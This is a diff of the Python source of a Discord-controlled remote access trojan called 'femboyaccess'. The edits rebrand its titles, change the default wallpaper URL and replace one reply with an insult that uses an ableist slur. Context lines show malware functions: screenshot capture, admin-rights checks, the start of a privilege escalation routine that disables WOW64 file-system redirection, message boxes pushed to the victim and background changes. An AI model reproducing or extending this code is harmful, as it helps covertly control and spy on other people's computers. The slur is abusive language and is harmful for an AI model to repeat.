@@ -203,7 +203,7 @@ async def check_privileges():
 		return "idk"
 
 async def femboyaccess(title, description):
-	full_title = "[2;35mfemboyaccess - " + title + f" >w< {version}[0m"
+	full_title = "[2;35mfemboyaccess - " + title + f" _ {version}[0m"
 	full_description = "[2;37m" + description + "[0m"
 	message = f"```ansi\n{full_title}\n\n{full_description}```"
 	return message
@@ -262,7 +262,7 @@ key_frequencies = {
 }
 
 async def create_piano_embed(message):
-	piano_embed = discord.Embed(title=f"femboyaccess - piano >w< {version}", description="click a key to play the according sound! ")
+	piano_embed = discord.Embed(title=f"vrsl - piano-- unleash your inner beethovern  {version}", description="click a key to play the according sound! ")
 	for key in key_frequencies:
 		piano_embed.add_field(name=key, value='\u200b', inline=True)
 	return await message.reply(embed=piano_embed)
@@ -664,7 +664,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 				is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 			return is_admin
 		if isAdmin():
-			await message.reply(await femboyaccess("escalate privileges", "you're already admin silly! "))
+			await message.reply(await femboyaccess("escalate privileges", "already admin u fucking retard! "))
 		else:
 			class disable_fsr():
 				disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
@@ -711,13 +711,13 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 
 	if message.content.startswith("msgbox"):
 		await msgbox(message, args=message.content)
-		await message.reply(await femboyaccess("msgbox", f"the user saw your message! "))
+		await message.reply(await femboyaccess("msgbox", f"the user saw your message, hope they like it "))
 
 	if message.content.startswith("background"):
 		if len(message.content.split(" ")) > 1:
 			image_url = message.content.split(" ")[1]
 		else:
-			image_url = "https://c4.wallpaperflare.com/wallpaper/90/932/24/astolfo-fate-apocrypha-astolfo-fate-grand-order-fate-apocrypha-fate-series-anime-hd-wallpaper-preview.jpg"
+			image_url = "https://theweereview.com/wp-content/uploads/2020/06/Obonjo-1-e1591133876509.jpg"
 
 		response = requests.get(image_url)
 		if response.status_code == 200:
